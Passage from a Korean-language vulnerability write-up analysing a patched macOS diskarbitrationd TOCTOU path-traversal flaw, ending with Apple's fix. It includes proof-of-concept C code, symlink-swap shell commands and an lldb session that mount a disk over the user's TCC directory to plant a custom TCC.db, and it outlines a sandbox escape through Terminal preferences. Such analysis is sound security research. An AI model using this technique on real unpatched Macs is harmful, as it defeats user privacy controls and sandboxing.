&#xB9C8;&#xC6B4;&#xD2B8; &#xACBD;&#xB85C; &#xAC80;&#xC99D;&#xC740; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; &#xCE21;&#xC5D0;&#xC11C; &#xC218;&#xD589;&#xB418;&#xBA70;, &#xC774;&#xB294; <code>DiskArbitration</code> &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xC758; <code>DADiskMountWithArgumentsCommon</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xCC98;&#xB9AC;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC989;, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC774; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xACE0; <strong>&#xC9C1;&#xC811; <code>diskarbitrationd</code>&#xB97C; &#xD638;&#xCD9C;</strong>&#xD558;&#xBA74;, &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; &#xCE21; &#xAC80;&#xC99D;&#xC744; &#xC644;&#xC804;&#xD788; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD558;&#xBA74; <code>../</code> &#xC694;&#xC18C;&#xB97C; &#xD3EC;&#xD568;&#xD55C; &#xACBD;&#xB85C;&#xB97C; <code>diskarbitrationd</code>&#xC5D0; &#xC804;&#xB2EC;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70;, &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; <strong>&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xAC80;&#xC0AC;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xACE0; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C; &#xAC80;&#xC99D;&#xAE4C;&#xC9C0; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;</strong>.</p><p>&#xC544;&#xB798;&#xB294; <code>DADiskMountWithArgumentsCommon</code> &#xD568;&#xC218;&#xC758; &#xC77C;&#xBD80; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function">__private_extern__ <span class="hljs-keyword">void</span> <span class="hljs-title">DADiskMountWithArgumentsCommon</span><span class="hljs-params">( DADiskRef disk,</span></span><span class="hljs-function"><span class="hljs-params">                               CFURLRef            path,</span></span><span class="hljs-function"><span class="hljs-params">                               DADiskMountOptions  options,</span></span><span class="hljs-function"><span class="hljs-params">                               DADiskMountCallback callback,</span></span><span class="hljs-function"><span class="hljs-params">                               <span class="hljs-keyword">void</span> *              context,</span></span><span class="hljs-function"><span class="hljs-params">                               CFStringRef         arguments[],</span></span><span class="hljs-function"><span class="hljs-params">                               <span class="hljs-keyword">bool</span>                block )</span></span><span class="hljs-function"></span>{...    <span class="hljs-keyword">if</span> ( path )    {        <span class="hljs-keyword">char</span> * _path;        _path = ___CFURLCopyFileSystemRepresentation( path );        <span class="hljs-keyword">if</span> ( _path )        {            <span class="hljs-keyword">char</span> name[MAXPATHLEN];            <span class="hljs-keyword">if</span> ( realpath( _path, name ) )            {                path = CFURLCreateFromFileSystemRepresentation( kCFAllocatorDefault, ( <span class="hljs-keyword">void</span> * ) name, <span class="hljs-built_in">strlen</span>( name ), TRUE );            }            <span class="hljs-keyword">else</span>            {                CFRetain( path );            }            <span class="hljs-built_in">free</span>( _path );        }        <span class="hljs-keyword">else</span>        {            CFRetain( path );        }    }    status = kDAReturnBadArgument;    <span class="hljs-keyword">if</span> ( disk )    {        status = _DAAuthorize( _DADiskGetSession( disk ), _kDAAuthorizeOptionIsOwner, disk, _kDAAuthorizeRightMount );        <span class="hljs-keyword">if</span> ( status == kDAReturnSuccess )        {            status = __DAQueueRequest( _DADiskGetSession( disk ), _kDADiskMount, disk, options, path ? CFURLGetString( path ) : <span class="hljs-literal">NULL</span>, argument, callback, context, block );        }    }...}</code></pre><p>&#xC704; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; <code>realpath</code> &#xBC0F; <code>CFURLCreateFromFileSystemRepresentation</code> &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC774; <code>../</code> &#xC694;&#xC18C;&#xB97C; &#xC81C;&#xAC70;&#xD558;&#xB294; &#xC5ED;&#xD560;&#xC744; &#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xC774; &#xAC80;&#xC99D; &#xACFC;&#xC815;&#xC740; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; &#xCE21;&#xC5D0;&#xC11C; &#xC218;&#xD589;&#xB418;&#xBBC0;&#xB85C;, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC9C1;&#xC811; <code>diskarbitrationd</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xBA74; &#xC774;&#xB97C; <strong>&#xC644;&#xC804;&#xD788; &#xBB34;&#xB825;&#xD654;</strong>&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>DiskArbitration</code> &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xC5EC; <strong><code>diskarbitrationd</code>&#xC5D0; &#xC9C1;&#xC811; ../ &#xC694;&#xC18C;&#xB97C; &#xD3EC;&#xD568;&#xD55C; &#xACBD;&#xB85C;&#xB97C; &#xC804;&#xB2EC;</strong>&#xD558;&#xBA74;, &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xACE0; TCC &#xBCF4;&#xD638; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0; &#xB9C8;&#xC6B4;&#xD2B8;&#xD558;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD574;&#xC9D1;&#xB2C8;&#xB2E4;.</p><h3 id="Explain-1"><a href="#Explain-1" class="headerlink" title="Explain 1"></a>Explain 1</h3><p>&#xC0AC;&#xC6A9;&#xC790;&#xC758; <code>~/Library/Application Support/com.apple.TCC</code> &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB97C; &#xB9C8;&#xC6B4;&#xD2B8;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC744; &#xD1B5;&#xD574; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xBD84;&#xC11D;&#xD558;&#xACE0;&#xC790; &#xD569;&#xB2C8;&#xB2E4;. &#xC0AC;&#xC6A9;&#xC790; &#xC815;&#xC758; <code>TCC.db</code>&#xB97C; &#xC0BD;&#xC785;&#xD558;&#xC5EC;, &#xC0C8;&#xB85C;&#xC6B4; TCC &#xADDC;&#xCE59;&#xC744; &#xC124;&#xC815;&#xD568;&#xC73C;&#xB85C;&#xC368; TCC Bypass&#xB97C; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><strong>1. <code>DAMount</code> &#xD568;&#xC218; &#xD638;&#xCD9C;</strong></p><pre><code class="hljs bash">/private/tmp/starthere/../../../Users/crab/Library/Application Support/com.apple.TCC</code></pre><p>&#xC704; &#xACBD;&#xB85C;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; <code>DAMount</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; &#xACBD;&#xB85C;&#xB97C; &#xD574;&#xC11D;&#xD558;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xC8FC;&#xC758;&#xD574;&#xC57C; &#xD558;&#xBA70;, <code>diskarbitrationd</code>&#xAC00; &#xC815;&#xD655;&#xD788; &#xB3D9;&#xC77C;&#xD55C; &#xACBD;&#xB85C;&#xB97C; &#xBC1B;&#xB3C4;&#xB85D; &#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p><strong>2. <code>sandbox_check_by_audit_token</code> &#xC2E4;&#xD589; &#xC2DC; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C; &#xC870;&#xC791;</strong></p><pre><code class="hljs bash">/private/tmp/starthere -&gt; /private/tmp/1/2/3</code></pre><p><code>sandbox_check_by_audit_token</code> &#xAC80;&#xC0AC;&#xAC00; &#xC2E4;&#xD589;&#xB420; &#xB54C;, &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">/private/tmp/Users/crab/Library/Application Support/com.apple.TCC</code></pre><p>&#xCD94;&#xAC00;&#xB85C; &#xB2E4;&#xC74C; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">/private/tmp/1/2/3/../../../Users/crab/Library/Application Support/com.apple.TCC</code></pre><p>&#xB530;&#xB77C;&#xC11C; <code>sandbox_check_by_audit_token</code>&#xC774; &#xACBD;&#xB85C;&#xB97C; &#xD655;&#xC778;&#xD560; &#xB54C; &#xBCC0;&#xD658; &#xACFC;&#xC815;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">/private/tmp/Users/crab/Library/Application Support/com.apple.TCC</code></pre><p>&#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; &#xC774; &#xACBD;&#xB85C;&#xB294; <code>/private/tmp/</code> &#xB0B4;&#xBD80;&#xC758; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0; &#xB9C8;&#xC6B4;&#xD2B8;&#xD558;&#xB294; &#xAC83;&#xC774; &#xD5C8;&#xC6A9;&#xB418;&#xBBC0;&#xB85C; &#xBCF4;&#xC548; &#xAC80;&#xC0AC;&#xB97C; &#xD1B5;&#xACFC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><strong>3. &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C; &#xC81C;&#xAC70; &#xBC0F; &#xB9C8;&#xC6B4;&#xD2B8; &#xC2E4;&#xD589;</strong></p><pre><code class="hljs bash">/private/tmp/**starthere**/../../../Users/crab/Library/Application Support/com.apple.TCC</code></pre><p><code>sandbox_check_by_audit_token</code> &#xAC80;&#xC0AC;&#xAC00; &#xC644;&#xB8CC;&#xB418;&#xBA74; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xB97C; &#xC0AD;&#xC81C;&#xD558;&#xACE0; &#xBE48; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB85C; &#xB300;&#xCCB4;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; <code>diskarbitrationd</code>&#xB294; &#xC678;&#xBD80; &#xB9C8;&#xC6B4;&#xD2B8; &#xBA85;&#xB839;&#xC744; &#xB2E4;&#xC2DC; &#xC2E4;&#xD589;&#xD558;&#xAC8C; &#xB418;&#xBA70;, &#xC704;&#xC640; &#xAC19;&#xC740; &#xACBD;&#xB85C;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">/Users/crab/Library/Application Support/com.apple.TCC</code></pre><p>&#xD558;&#xC9C0;&#xB9CC; &#xC774;&#xBC88;&#xC5D0;&#xB294; <code>starthere</code>&#xAC00; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xAC00; &#xC544;&#xB2C8;&#xB77C; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC774;&#xBBC0;&#xB85C;, &#xCD5C;&#xC885; &#xBCC0;&#xD658; &#xACFC;&#xC815;&#xC740; &#xC704;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xC81C; &#xC774; &#xACBD;&#xB85C;&#xC5D0;&#xB294; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC9C0; &#xC54A;&#xC73C;&#xBBC0;&#xB85C;, &#xCEE4;&#xB110;&#xC774; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xCC98;&#xB9AC;&#xD560; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; <code>diskarbitrationd</code>&#xC774;&#xBBC0;&#xB85C;, &#xC774;&#xB294; <code>com.apple.private.security.storage-exempt.heritable</code> &#xAD8C;&#xD55C;&#xC744; &#xAC00;&#xC9C0;&#xBA70;, &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xCEE4;&#xB110;&#xC758; <strong>MACF(Mandatory Access Control Framework) Sandbox &#xAC80;&#xC0AC;</strong>&#xB3C4; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC774; &#xBC29;&#xBC95;&#xC740; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C;&#xB3C4; &#xC791;&#xB3D9;&#xD569;&#xB2C8;&#xB2E4;.</p><p><strong>4. TCC Bypass &#xBC0F; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xD0C8;&#xCD9C;</strong></p><p>1-3 &#xACFC;&#xC815;&#xC744; &#xD1B5;&#xD574; <strong>TCC Bypass</strong>&#xB97C; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; <strong>&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xB97C; &#xD0C8;&#xCD9C;&#xD558;&#xB824;&#xBA74;</strong> &#xBE44;&#xC2B7;&#xD55C; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; <code>~/Library/Preferences</code> &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xB97C; &#xB9C8;&#xC6B4;&#xD2B8;&#xD558;&#xACE0;, &#xC0AC;&#xC6A9;&#xC790; &#xC815;&#xC758; Terminal &#xD658;&#xACBD;&#xC124;&#xC815; &#xD30C;&#xC77C;&#xC744; &#xBC30;&#xCE58;&#xD558;&#xC5EC; Terminal&#xC774; &#xC5F4;&#xB9B4; &#xB54C; &#xD2B9;&#xC815; &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xB3C4;&#xB85D; &#xC124;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C;, &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; <strong>Time Of Check Time Of Use (TOCTOU)</strong> &#xBC84;&#xADF8;&#xC774;&#xBA70;, <a href="https://hackyboiz.github.io/2024/11/27/clalxk/CVE-2024-44175/">&#xC774;&#xC804; &#xAE00;</a>&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xD588;&#xB358; &#xCDE8;&#xC57D;&#xC810;&#xACFC; &#xC720;&#xC0AC;&#xD55C; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xB3D9;&#xC791;&#xD569;&#xB2C8;&#xB2E4;.</p><hr><h3 id="Explain-2"><a href="#Explain-2" class="headerlink" title="Explain 2"></a>Explain 2</h3><p>Explain 1&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xB514;&#xBC84;&#xAC70;&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xC5EC; &#xC218;&#xD589;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-meta">#import <span class="hljs-meta-string">&lt;DiskArbitration/DiskArbitration.h&gt;</span></span><span class="hljs-meta">#import <span class="hljs-meta-string">&lt;Foundation/Foundation.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>{    DASessionRef session = DASessionCreate(kCFAllocatorDefault);    DADiskRef disk = DADiskCreateFromBSDName(kCFAllocatorDefault, session, <span class="hljs-string">&quot;/dev/disk6s1&quot;</span>);    CFDictionaryRef properties;    CFURLRef diskurl = (__bridge CFURLRef)[NSURL fileURLWithPath:@<span class="hljs-string">&quot;/dev/disk6s1&quot;</span>];    CFURLRef url = (__bridge CFURLRef)[NSURL fileURLWithPath:@<span class="hljs-string">&quot;/private/tmp/starthere/../../../Users/crab/Library/Application Support/com.apple.TCC&quot;</span>];    DADiskMount(disk, url, kDADiskMountOptionDefault, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p><code>/private/tmp/starthere/../../../Users/crab/Library/Application Support/com.apple.TCC</code> &#xACBD;&#xB85C;&#xC5D0; &#xB514;&#xC2A4;&#xD06C;&#xB97C; &#xB9C8;&#xC6B4;&#xD2B8;&#xD558;&#xB824;&#xACE0; &#xC2DC;&#xB3C4;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCF54;&#xB4DC;&#xB97C; &#xCEF4;&#xD30C;&#xC77C;&#xD558;&#xACE0; <code>lldb</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xC2DC;&#xC791;&#xD55C; &#xD6C4;, &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xBE0C;&#xB808;&#xC774;&#xD06C;&#xD3EC;&#xC778;&#xD2B8;&#xB97C; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">(lldb) breakpoint listCurrent breakpoints:1: name = <span class="hljs-string">&apos;realpath&apos;</span>, locations = 1, resolved = 1, hit count = 0  1.1: <span class="hljs-built_in">where</span> = libsystem_c.dylib`realpath, address = 0x00000001921de874, resolved, hit count = 0 2: name = <span class="hljs-string">&apos;DADiskMountWithArgumentsCommon&apos;</span>, locations = 1, resolved = 1, hit count = 1  2.1: <span class="hljs-built_in">where</span> = DiskArbitration`DADiskMountWithArgumentsCommon, address = 0x000000019a1bdb48, resolved, hit count = 1 3: address = DiskArbitration[0x0000000188325c1c], locations = 1, resolved = 1, hit count = 1  3.1: <span class="hljs-built_in">where</span> = DiskArbitration`DADiskMountWithArgumentsCommon + 212, address = 0x000000019a1bdc1c, resolved, hit count = 1 4: name = <span class="hljs-string">&apos;__DAQueueRequest&apos;</span>, locations = 1, resolved = 1, hit count = 1  4.1: <span class="hljs-built_in">where</span> = DiskArbitration`__DAQueueRequest, address = 0x000000019a1bcde0, resolved, hit count = 1</code></pre><p><code>diskarbitrationd</code> &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; <code>lldb</code>&#xB97C; &#xC5F0;&#xACB0;&#xD558;&#xACE0; <code>sandbox_check_by_audit_token</code>&#xC5D0; &#xB300;&#xD55C; &#xBE0C;&#xB808;&#xC774;&#xD06C;&#xD3EC;&#xC778;&#xD2B8; &#xC124;&#xC815;</p><pre><code class="hljs routeros">(lldb) breakpoint listCurrent breakpoints:2: name = <span class="hljs-string">&apos;sandbox_check_by_audit_token&apos;</span>, locations = 1, resolved = 1, hit count = 4  2.1: where = libsystem_sandbox.dylib`sandbox_check_by_audit_token,<span class="hljs-built_in"> address </span>= 0x000000019d5a61cc, resolved, hit count = 4</code></pre><p>&#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C; &#xBC0F; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xC900;&#xBE44;</p><pre><code class="hljs gradle">ln -s <span class="hljs-regexp">/private/</span>tmp<span class="hljs-regexp">/deep/</span><span class="hljs-number">1</span><span class="hljs-regexp">/2 /</span><span class="hljs-keyword">private</span><span class="hljs-regexp">/tmp/</span>startheremkdir -p <span class="hljs-string">&quot;/private/tmp/Users/crab/Library/Application Support/com.apple.TCC/&quot;</span></code></pre><hr><p><strong>&#xC2E4;&#xD589; &#xD6C4; LLDB &#xB514;&#xBC84;&#xAE45; &#xACFC;&#xC815;</strong></p><p>1.&#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xACE0; &#xBE0C;&#xB808;&#xC774;&#xD06C;&#xD3EC;&#xC778;&#xD2B8;&#xC5D0; &#xB3C4;&#xB2EC;&#xD568;</p><pre><code class="hljs routeros">(lldb) runProcess 1591 launched: <span class="hljs-string">&apos;/Users/crab/m&apos;</span> (arm64)Process 1591 stopped* thread #1,<span class="hljs-built_in"> queue </span>= <span class="hljs-string">&apos;com.apple.main-thread&apos;</span>, stop reason = breakpoint 2.1</code></pre><p>2.<code>X1</code> &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xBA54;&#xBAA8;&#xB9AC; &#xB364;&#xD504;</p><pre><code class="hljs angelscript">(lldb) memory read -f p $x1<span class="hljs-number">0x600000024060</span>: <span class="hljs-number">0x01000001fa131911</span> <span class="hljs-number">0x0001cc4fc6001d80</span> <span class="hljs-number">0x0800010060015821</span> <span class="hljs-number">0x0000600000f24000</span></code></pre><p>3.&#xACBD;&#xB85C; &#xBB38;&#xC790;&#xC5F4; &#xD655;&#xC778;</p><pre><code class="hljs angelscript">(lldb) memory read -f s <span class="hljs-number">0x0000600000f24000</span>+<span class="hljs-number">16</span><span class="hljs-number">0x600000f24010</span>: <span class="hljs-string">&quot;^file:///private/tmp/starthere/../../../Users/crab/Library/Application%20Support/com.apple.TCC/&quot;</span></code></pre><p>4.<code>__DAQueueRequest</code> &#xBE0C;&#xB808;&#xC774;&#xD06C;&#xD3EC;&#xC778;&#xD2B8;&#xC5D0;&#xC11C; &#xC911;&#xC9C0; &#xD6C4; <code>X4</code> &#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xAC12; &#xD655;&#xC778;</p><pre><code class="hljs arduino">(lldb) <span class="hljs-keyword">register</span> <span class="hljs-built_in">read</span> $x4      x4 = <span class="hljs-number">0x0000600000020000</span></code></pre><p>5.&#xACBD;&#xB85C; &#xBB38;&#xC790;&#xC5F4; &#xD655;&#xC778;</p><pre><code class="hljs perl">(lldb) memory <span class="hljs-keyword">read</span> -f <span class="hljs-keyword">s</span> $x4+<span class="hljs-number">16</span><span class="hljs-number">0x600000020010</span>: <span class="hljs-string">&quot;Kfile:///private/tmp/Users/crab/Library/Application%20Support/com.apple.TCC/&quot;</span></code></pre><p>6.<code>X4</code> &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB97C; &#xC6D0;&#xB798; &#xACBD;&#xB85C; &#xAC12;&#xC73C;&#xB85C; &#xB36E;&#xC5B4;&#xC4F0;&#xAE30;</p><pre><code class="hljs arduino">(lldb) <span class="hljs-keyword">register</span> <span class="hljs-built_in">write</span> $x4 <span class="hljs-number">0x0000600000f24000</span>(lldb) c<span class="hljs-built_in">Process</span> <span class="hljs-number">1606</span> resuming</code></pre><p>7.<code>diskarbitrationd</code> &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C; <code>sandbox_check_by_audit_token</code> &#xBE0C;&#xB808;&#xC774;&#xD06C;&#xD3EC;&#xC778;&#xD2B8;&#xC5D0;&#xC11C; &#xBA48;&#xCDA4;</p><pre><code class="hljs routeros">(lldb) cProcess 113 resumingProcess 113 stopped* thread #2,<span class="hljs-built_in"> queue </span>= <span class="hljs-string">&apos;DAServer&apos;</span>, stop reason = breakpoint 2.1</code></pre><p>8.&#xBA54;&#xBAA8;&#xB9AC; &#xB364;&#xD504;&#xB97C; &#xD1B5;&#xD574; &#xACBD;&#xB85C;&#xAC00; &#xC720;&#xC9C0;&#xB418;&#xACE0; &#xC788;&#xC74C;&#xC744; &#xD655;&#xC778;</p><pre><code class="hljs stata">(lldb) <span class="hljs-keyword">memory</span> <span class="hljs-keyword">read</span> -f s 0x000000014ea0cc900x14ea0cc90: <span class="hljs-string">&quot;/private/tmp/starthere/../../../Users/crab/Library/Application Support/com.apple.TCC&quot;</span></code></pre><p>9.<code>sandbox_check_by_audit_token</code> &#xD638;&#xCD9C; &#xD6C4; &#xBC18;&#xD658; &#xAC12; &#xD655;&#xC778;</p><pre><code class="hljs arduino">(lldb) finish(lldb) <span class="hljs-keyword">register</span> <span class="hljs-built_in">read</span> $x0      x0 = <span class="hljs-number">0x0000000000000000</span></code></pre><p><code>sandbox_check_by_audit_token</code>&#xAC00; <code>0</code>&#xC744; &#xBC18;&#xD658;&#xD558;&#xC5EC; &#xAC80;&#xC0AC;&#xB97C; &#xD1B5;&#xACFC;&#xD569;&#xB2C8;&#xB2E4;. </p><p>10.<code>starthere</code>&#xB97C; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xC5D0;&#xC11C; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB85C; &#xBCC0;&#xACBD; &#xD6C4; <code>diskarbitrationd</code> &#xC2E4;&#xD589; &#xBC0F; &#xB9C8;&#xC6B4;&#xD2B8; &#xACB0;&#xACFC; &#xD655;&#xC778;</p><pre><code class="hljs awk">crab@see /tmp % rm startherecrab@see /tmp % mkdir starthere(lldb) ccrab@see /tmp % mount...<span class="hljs-regexp">/dev/</span>disk6s1 on <span class="hljs-regexp">/Users/</span>crab<span class="hljs-regexp">/Library/</span>Application Support/com.apple.TCC (apfs, local, nodev, nosuid, journaled, noowners, mounted by crab)</code></pre><h3 id="&#xD328;&#xCE58;-&#xC0AC;&#xD56D;"><a href="#&#xD328;&#xCE58;-&#xC0AC;&#xD56D;" class="headerlink" title="&#xD328;&#xCE58; &#xC0AC;&#xD56D;"></a>&#xD328;&#xCE58; &#xC0AC;&#xD56D;</h3><p>Apple&#xC740; macOS Sequoia 15.0&#xC5D0;&#xC11C; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC218;&#xC815;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( mntpath ){    <span class="hljs-keyword">if</span> ( ( _argument1 &amp; kDADiskMountOptionNoFollow ) == <span class="hljs-number">0</span> )    {        <span class="hljs-keyword">if</span> ( realpath( mntpath, path ) )        {            CFTypeRef mountpath = CFURLCreateFromFileSystemRepresentation( kCFAllocatorDefault, ( <span class="hljs-keyword">void</span> * ) path, <span class="hljs-built_in">strlen</span>( path ), TRUE );            <span class="hljs-keyword">if</span> ( mountpath )            {                DARequestSetArgument2( request, CFURLGetString( mountpath ) );                CFRelease ( mountpath );            }        }        <span class="hljs-keyword">else</span>        {            status = kDAReturnBadArgument;        }    }}</code></pre><p>path resolution&#xC774; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; &#xCE21;&#xC774; &#xC544;&#xB2C8;&#xB77C;, &#xC694;&#xCCAD;&#xC774; &#xB4E4;&#xC5B4;&#xC62C; &#xB54C; <code>diskarbitrationd</code>&#xC5D0;&#xC11C; &#xC218;&#xD589;&#xB418;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xC218;&#xC815;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xACF5;&#xACA9;&#xC790;&#xAC00; <code>../</code> &#xC694;&#xC18C;&#xAC00; &#xD3EC;&#xD568;&#xB41C; &#xACBD;&#xB85C;&#xB97C; &#xC804;&#xB2EC;&#xD558;&#xB294; &#xBB38;&#xC81C;&#xB97C; &#xC81C;&#xAC70;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70;, &#xC774; &#xACBD;&#xB85C;&#xB294; &#xC77C;&#xBC18;&#xC801;&#xC778; &#xD638;&#xCD9C;&#xC790;&#xB4E4;&#xC5D0;&#xAC8C; &#xAE30;&#xC874;&#xACFC; &#xB3D9;&#xC77C;&#xD55C; &#xB3D9;&#xC791;&#xC744; &#xC720;&#xC9C0;&#xD558;&#xB3C4;&#xB85D; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E8;, &#xC774; &#xACBD;&#xB85C; &#xAC80;&#xC99D; &#xB85C;&#xC9C1;&#xC740; <code>kDADiskMountOptionNoFollow</code> &#xC635;&#xC158;&#xC774; &#xC81C;&#xACF5;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xACBD;&#xC6B0;&#xC5D0;&#xB9CC; &#xC218;&#xD589;&#xB429;&#xB2C8;&#xB2E4;. &#xC989;, &#xB9CC;&#xC57D; <code>kDADiskMountOptionNoFollow</code>&#xB97C; &#xC804;&#xB2EC;&#xD558;&#xBA74; &#xC5EC;&#xC804;&#xD788; &#xC6D0;&#xB798;&#xC758; &#xACF5;&#xACA9;&#xC744; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xB294; &#xAC83;&#xC774;&#xC8E0;. &#xC774;&#xB97C; &#xCC28;&#xB2E8;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xB450; &#xBC88;&#xC9F8; 